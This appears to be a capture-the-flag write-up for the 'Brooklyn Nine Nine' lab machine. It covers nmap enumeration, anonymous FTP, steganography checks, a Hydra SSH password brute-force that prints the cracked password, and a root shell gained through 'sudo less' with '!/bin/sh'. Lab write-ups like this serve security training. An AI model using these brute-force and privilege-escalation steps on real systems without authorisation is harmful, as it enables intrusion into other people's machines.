## Nmap: 
---
```bash
nmap -T4 -n -A 10.64.152.236 -oN nmap
```

```bash
Nmap scan report for 10.64.152.236
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.154.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- so we see a `web-server` is running, `SSH` is open and `FTP` 
- `FTP` has anonymous login allowed, so lets look into this first
## FTP: 
---
```bash
ftp 10.64.152.236
```
- when asked for a username we can just simply enter the name `anonymous` and press `Enter` when we get asked for a `password` 

```ftp
ftp> ls -la
229 Entering Extended Passive Mode (|||16585|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```
- so we see a `note_to_jake.txt`, lets get this file with: `get note_to_jake.txt` 

- `note_to_jake.txt`: 
```bash
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
- so `Jake` is probably a user, lets remember this 
- lets open up the website first and try to `brute-force` Jake's password later

## further Enumeration: 
---
![](Brooklyn%20Nine%20Nine/images/Brooklyn_Nine_Nine_1.png)
- on the website, we just see a picture from the series 
- in the `source-code` is a comment: 
```
<!-- Have you ever heard of steganography? -->
```

- `steganography` in this context probably means that data is hiding in this picture, so lets download it: 
```bash
wget http://10.64.152.236/brooklyn99.jpg
```

- we can tried to extract data from this `JPEG` with `steghide`: 
```bash
steghide extract -sf brooklyn99.jpg
```
- I thought that maybe the passphrase, we have to enter to extract the data, is empty, but that was not the case 
- so we can't get further, lets now use `Hydra` to brute-force the password 
## Hydra: 
---
```bash
hydra -l jake -P /usr/share/rockyou.txt 10.64.152.236 ssh
```

```bash
[DATA] attacking ssh://10.64.152.236:22/
[22][ssh] host: 10.64.152.236   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```
- lets now log into `SSH` with the found creds 
## Privilege Escalation: 
----
- the `user.txt` is in `holt's` home directory and we can read it with `jake`: 
```bash
e<Redacted>e
```

- after that I executed `sudo -l` to see what we can run with `sudo`: 
```bash 
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
- so we can run `less` as root, lets got to `GTFOBins` to see if `less` can be used to read files or to get a `root-shell` 
![](Brooklyn%20Nine%20Nine/images/Brooklyn_Nine_Nine_2.png)

- but first I wanted to check out the `/var/www/html`, because the comment about `steganography` was stuck in my head and i wanted to see if their meant an other picture 
```bash
jake@brookly_nine_nine:/var/www/html$ ls -la
total 116
drwxr-xr-x 2 www-data www-data  4096 May 26  2020 .
drwxr-xr-x 3 root     root      4096 May 17  2020 ..
-rw-r--r-- 1 root     root     69685 May 26  2020 brooklyn99.jpg
-rwxr-xr-x 1 www-data www-data   718 May 18  2020 index.html
-rw-r--r-- 1 root     root     30518 May 18  2020 photo.jpg
```
- in the directory is another picture, so my intuition was right
- lets try do download it: 
```bash
wget http://10.64.152.236/photo.jpg
```

- lets try using `steghide` again: 
```bash
steghide extract -sf photo.jpg
```
- when I was asked for a passphrase I simply pressed `Enter` 
- and a `note.txt` got extracted
- `note.txt`: 
```bash
----------- StillNoob was here ------------------
```
- so a rabbit-hole 

- let now use execute: 
```bash
sudo less /etc/profile
!/bin/sh
```

- now we can read the `root.txt`: 
```bash
6<Redacted>5
```
